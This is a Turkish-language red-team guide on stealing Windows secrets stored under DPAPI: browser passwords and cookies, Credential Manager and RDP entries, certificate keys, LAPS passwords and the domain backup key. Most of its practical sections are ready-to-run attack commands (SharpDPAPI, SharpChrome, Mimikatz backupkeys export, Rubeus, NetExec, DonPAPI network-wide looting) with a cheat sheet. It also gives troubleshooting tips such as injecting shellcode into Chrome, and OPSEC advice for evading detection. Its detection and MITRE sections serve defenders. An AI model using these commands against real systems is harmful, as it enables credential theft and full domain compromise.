## 1. Genel Bakış ve Mimari

LSASS bellek dökümü ([03.2](./03.2_LSASS_Bellek_Dokumu.md)) yalnızca o an makinede oturum açmış aktif kullanıcıların kimliklerini sunar. Ancak sistemde disk üzerinde **saklanan (at-rest)** devasa bir sır hazinesi bulunur:
* Web tarayıcılarında kayıtlı parolalar ve oturum çerezleri (Chrome, Edge, Firefox),
* Uzak masaüstü (RDP) kayıtlı kimlikleri (`.rdp`, `.rdg`),
* Windows Kimlik Yöneticisi (Credential Manager) girdileri,
* Wi-Fi profilleri, zamanlanmış görev servis parolaları,
* Active Directory Certificate Services (AD CS) için istemci sertifikası özel anahtarları.

Windows bu sırların tamamını **DPAPI (Data Protection API)** mimarisiyle şifreler:

```
                      [ Kullanıcı Parolası / NT Karması ]
                                       │
                                    PBKDF2
                                       ▼
    [ Master Key Dosyası ] (%APPDATA%\Microsoft\Protect\<SID>\<GUID>)
              │
              ├── (Yol 1: Kullanıcı Parolası / Hash ile Çözüm)
              │
              └── (Yol 2: DC Domain Backup Key (PVK) ile Çözüm) ──► [ TÜM DOMAIN! ]
                                       │
      ┌───────────────────┬────────────┴────────────┬───────────────────┐
      ▼                   ▼                         ▼                   ▼
[ Web Tarayıcıları ]  [ Credential Manager ]    [ RDP / Wi-Fi ]     [ Kullanıcı Sertifikaları ]
  (Login Data &         (Domain / Web             (Kayıtlı Parola     (.pfx Özel Anahtarları
   Session Cookies)      Credentials)              ve Profiller)       ──► PKINIT Bilet Talebi!)
```

> **Credential Guard'ı Baypas Eden Güç:**
> Credential Guard (VBS) yalnızca LSASS bellek alanındaki oturum sırlarını yalıtır; diskte DPAPI ile şifrelenmiş dosyalara dokunmaz. Kullanıcı bağlamında çalışan bir saldırgan, LSASS'a hiçbir müdahalede bulunmadan `CryptUnprotectData` API'si ile tüm sırları anında çözer.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 DPAPI Anahtar Hiyerarşisi
1. **Master Key:** `%APPDATA%\Microsoft\Protect\<User_SID>\<MasterKey_GUID>` dosyasında tutulan 512-bitlik simetrik anahtardır.
2. **Kullanıcı Pre-Key:** Kullanıcının NT karması ve parola türevinden PBKDF2/SHA1 ile hesaplanır; yerel Master Key'i çözer.
3. **Domain Backup Key (LSA Secret `G$BCKUPKEY_P`):**
   * Active Directory ortamlarında, kullanıcı parolasını unutup yönetici tarafından sıfırlandığında DPAPI sırlarının kaybolmaması için geliştirilmiş bir kurtarma mekanizmasıdır.
   * Her etki alanı denetleyicisi (DC), bir **Domain Backup Key (RSA Private Key)** çiftine sahiptir.
   * Kullanıcının her Master Key'inin yedeği bu genel anahtarla şifrelenerek dosyanın içine gömülür (`BackupKey`).
   * **Kırmızı Takım Kazancı:** Domain Admin olan bir saldırgan, DC'den bu yedek anahtarı (`backup.pvk`) bir kez çektiğinde; **etki alanındaki TÜM kullanıcıların diskteki Master Key'lerini çevrimdışı deşifre edebilir**.

### 2.2 Windows LAPS (v1 vs Windows LAPS v2)
Kurumsal ortamlarda yerel yönetici parolalarını tekilleştiren LAPS yapısı iki farklı nesil barındırır:
* **LAPS v1 (Eski):** `ms-MCS-AdmPwd` özniteliğinde parolanın **açık metin (cleartext)** olarak saklandığı yapıdır. Nesne üzerinde `AllExtendedRights` veya okuma izni olan her kullanıcı parolayı doğrudan görür.
* **Windows LAPS (v2 - Modern Server 2022/2025):** `msLAPS-Password` özniteliği kullanılır. Parola Active Directory CMS (Cryptographic Message Syntax) veya DPAPI ile şifrelenir. Yalnızca yetkilendirilmiş gruplar veya DC Domain Backup Key sahipleri tarafından çözülebilir.

### 2.3 Web Tarayıcıları ve App-Bound Encryption (Chrome v127+)
Modern Chromium tabanlı tarayıcılar (Chrome v127+, Edge) çerezleri ve parolaları korumak için klasik DPAPI üzerine **App-Bound Encryption** katmanı eklemiştir:
* Şifreleme anahtarı yalnızca Google Chrome sistem servisi bağlamında çalışan süreçler tarafından çözülebilir.
* Standart kullanıcı bağlamında doğrudan SQLite dosyası kopyalandığında çözümleme başarısız olur; saldırganın Chrome sürecine enjeksiyon yapması veya SYSTEM seviyesinde token taklidi kullanması gerekir.

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: SharpDPAPI ve SharpChrome ile Bellek İçi Sır Hasadı

```powershell
# 1. Kullanıcı bağlamında çalışan tüm Master Key'leri otomatik çözme
.\SharpDPAPI.exe masterkeys

# 2. Windows Credential Manager üzerinde saklanan etki alanı ve RDP parolalarını çekme
.\SharpDPAPI.exe credentials

# 3. Chrome ve Edge üzerindeki tüm kayıtlı parolaları ve oturum çerezlerini dökme
.\SharpChrome.exe logins
.\SharpChrome.exe cookies /format:json
```

---

### Senaryo 2: Domain Backup Key Çekme ve Tüm Kullanıcıların Sırlarını Çözme

```cmd
:: 1. Domain Admin yetkisiyle DC'den Domain Backup Anahtarını (PVK) dışa aktarma (Mimikatz)
mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:dc01.corp.local /export" exit
:: Çıktı: ntds_backup_key.pvk

:: 2. Linux üzerinden secretsdump ile yedek anahtarı çekme
impacket-secretsdump corp.local/admin:'Pass123!'@10.10.10.5 -history -user-status

:: 3. Elde edilen PVK anahtarı ile kurban bir yöneticinin indirilen Master Key dosyasını çevrimdışı çözme
SharpDPAPI.exe masterkeys /pvk:ntds_backup_key.pvk /target:C:\Users\victim\AppData\Roaming\Microsoft\Protect\
```

---

### Senaryo 3: Sertifika Özel Anahtarlarını Hasat Etme (PKINIT Sıçraması)

```powershell
# 1. Kullanıcının CryptoAPI / CNG mağazasındaki tüm sertifikalarını dışa aktarma (.pfx)
.\SharpDPAPI.exe certificates /nowrap

# 2. Çıkan .pfx sertifikası Client Authentication içeriyorsa, Rubeus ile TGT talep etme
.\Rubeus.exe asktgt /user:mehmet.oz /certificate:cert.pfx /password:password /nowrap

# Sonuç: Parola değişse dahi geçerli kalan resmi Kerberos TGT bileti elde edilir!
```

---

### Senaryo 4: Windows LAPS v1 ve v2 Parolalarını Çekme

```bash
# 1. LAPS v1 (Açık Metin ms-MCS-AdmPwd) Okuma (NetExec)
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' -M laps

# 2. Windows LAPS (v2 msLAPS-Password) Okuma ve Deşifre Etme (pyLAPS)
python3 pylaps.py -u jdoe -p 'Summer2024!' -d corp.local --dc-ip 10.10.10.5
```

---

### Senaryo 5: DonPAPI ile Ağ Genelinde Otomatik DPAPI Taraması

```bash
# Ağdaki tüm makinelerin Credential Manager, RDP ve tarayıcı sırlarını tek seferde toplama
donpapi -u jdoe -p 'Summer2024!' -d corp.local --dc-ip 10.10.10.5 -t 10.10.10.0/24 -o /tmp/loot_dpapi/
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `SharpDPAPI: MasterKey cannot be decrypted` | Kullanıcının parolasını bilmiyorsunuz ve Domain Backup Key (`.pvk`) parametresi verilmedi. | Parola biliniyorsa `/password:` bayrağını ekleyin; bilinmiyorsa DC üzerinden `backupkeys` çekip `/pvk:` ile çözün. |
| `Chrome App-Bound Encryption: Decryption failed` | Chrome v127+ üzerinde App-Bound Encryption aktiftir; standart kullanıcı bağlamından okunamaz. | Kullanıcı adına Chrome sürecine shellcode/DLL enjekte edin veya SYSTEM token'ı alarak `elevation_service` ile çözün. |
| `lsadump::backupkeys: RPC Server Unavailable` | DC üzerinde port 135 veya dinamik RPC erişimi güvenlik duvarına takılmıştır. | DC IP'sine doğru SMB/RPC rotasını kontrol edin; LDAP üzerinden kovan dökümünü deneyin. |
| `LAPS: (0x5) Access Denied on ms-MCS-AdmPwd` | Bağlanılan kullanıcının bilgisayar nesnesi üzerinde genişletilmiş hakları (Extended Rights) yoktur. | Kullanıcı grubunun LAPS okuma iznini BloodHound üzerinde `ReadLAPSPassword` kenarı ile sorgulayın. |
| `Credential Manager: Generic Credentials damaged` | Dosya aktarımı sırasında ikili (binary) bozulma oluşmuştur. | Dosyaları base64 ile kodlayarak aktarın; dosya bütünlüğünü hash ile karşılaştırın. |
| `DonPAPI: Connection reset by peer` | Hedef makinelerdeki güvenlik duvarı port 445 erişimini blokluyordur. | Sadece erişilebilir olan hostları hedef listesine ekleyin (`--target-file`). |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **Directory Service Event ID 4662 (An operation was performed on an object):** DC üzerinde `G$BCKUPKEY` nesnesi sorgulandığında veya `LsarRetrievePrivateData` çağrısı yapıldığında loglanır.
* **Windows Security Event ID 4688 / Sysmon Event ID 1:** `SharpDPAPI.exe`, `SharpChrome.exe` komut satırı çağrıları.
* **Dosya Sistemi Erişimi (Sysmon Event ID 11):** `AppData\Roaming\Microsoft\Protect\` klasöründeki GUID dosyalarına ve `User Data\Default\Login Data` dosyalarına yönelik seri okuma hareketleri.

### 5.2 Ağ ve EDR İmzaları
* DonPAPI veya NetExec ile ağdaki yüzlerce iş istasyonuna yapılan seri SMB bağlantıları ve C$ paylaşımı üzerinden `AppData` okuma girişimleri NDR/SIEM alarmlarını tetikler.
* DC üzerinde Domain Backup Key talebi normal bir admin davranışı değildir; yüksek öncelikli tehdit alarmı üretir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Senaryosu |
| :--- | :--- | :--- |
| **[T1555.003](https://attack.mitre.org/techniques/T1555/003/)** | Credentials from Web Browsers | Chrome ve Edge üzerinden kayıtlı parola ve çerezlerin hasadı. |
| **[T1555.004](https://attack.mitre.org/techniques/T1555/004/)** | Credentials from Password Stores: Windows Credential Manager | Credential Manager kasasından RDP ve domain hesaplarının çekilmesi. |
| **[T1552.001](https://attack.mitre.org/techniques/T1552/001/)** | Unsecured Credentials: Credentials in Files | LAPS açık metin parolalarının LDAP üzerinden okunması. |
| **[T1003](https://attack.mitre.org/techniques/T1003/)** | OS Credential Dumping | DC'den Domain Backup Key çekilerek tüm kullanıcıların DPAPI sırlarının çözülmesi. |

### 5.4 OPSEC Tavsiyeleri ve Savunma Karşılığı

| Kırmızı Takım Operatör Riski | OPSEC İyileştirme Adımı | Savunma (Blue Team) Karşı Tedbiri |
| :--- | :--- | :--- |
| DC'den backup key çekerken yakalanmak | Backup key çekmek yerine kullanıcı bağlamında `CryptUnprotectData` API'sini yerel olarak çağırın. | DC üzerinde `Event ID 4662` ile `G$BCKUPKEY` nesnesine erişimleri SIEM'de acil durum kuralı yapın. |
| Ağ genelinde DonPAPI ile toplu tarama | Tüm ağı taramak yerine yalnızca hedef alınan tekil sunucunun sırlarını çekin. | Uç noktalarda LAPS v2 (Windows LAPS) uygulayın; parolaları AES şifreli tutun. |
| Tarayıcı SQLite dosyalarını diske kopyalamak | Diske dosya yazmadan bellekte SQL ayrıştırması yapın. | Credential Guard ile LSASS'ı korurken, EDR ile tarayıcı klasörlerine izinsiz erişimleri engelleyin. |

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```powershell
# 1. Kullanıcı Bağlamında Tüm Tarayıcı Parolalarını Çekme (SharpChrome)
.\SharpChrome.exe logins
# Ne Yapar?: Chrome ve Edge SQLite veri tabanını çözerek açık metin web şifrelerini basar.
# Ne Zaman Kullanılır?: İstemcide interaktif veya beacon shell alındığında.

# 2. Credential Manager'daki Domain Parolalarını Dökme (SharpDPAPI)
.\SharpDPAPI.exe credentials
# Ne Yapar?: Windows Kasası'nda saklanan uzak masaüstü ve ağ paylaşımları kimliklerini çözer.
# Ne Zaman Kullanılır?: Başka sunuculara sıçramak için hazır yönetici parolası ararken.

# 3. İstemci Sertifikalarını ve Özel Anahtarlarını Hasat Etme
.\SharpDPAPI.exe certificates /nowrap
# Ne Yapar?: DPAPI ile kilitlenmiş kullanıcı sertifikalarını .pfx olarak çıkarır.
# Ne Zaman Kullanılır?: PKINIT ile kalıcı Kerberos TGT bileti üretmek için.

# 4. DC Üzerinden Domain Backup Anahtarını Dışa Aktarma (Mimikatz)
mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:dc01.corp.local /export" exit
# Ne Yapar?: Tüm etki alanındaki kullanıcıların DPAPI sırlarını çözebilen RSA özel anahtarını (.pvk) çeker.
# Ne Zaman Kullanılır?: Domain Admin seviyesine ulaşıldığında nihai kalıcılık ve sır hasadı için.

# 5. NetExec ile LAPS v1 Parolasını Çekme
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' -M laps
# Ne Yapar?: Yetkimiz olan bilgisayarların yerel Administrator açık metin şifresini okur.
# Ne Zaman Kullanılır?: Yerel makinelere admin olarak sıçramak için.

# 6. DonPAPI ile Ağ Genelinde Otomatik Hasat
donpapi -u jdoe -p 'Summer2024!' -d corp.local --dc-ip 10.10.10.5 -t 10.10.10.50
# Ne Yapar?: Hedef sunucudaki tüm kullanıcı profillerini ve kasalarını otomatik çözüp klasöre yazar.
# Ne Zaman Kullanılır?: Manuel analizle vakit kaybetmeden tüm sırları indirmek için.
```
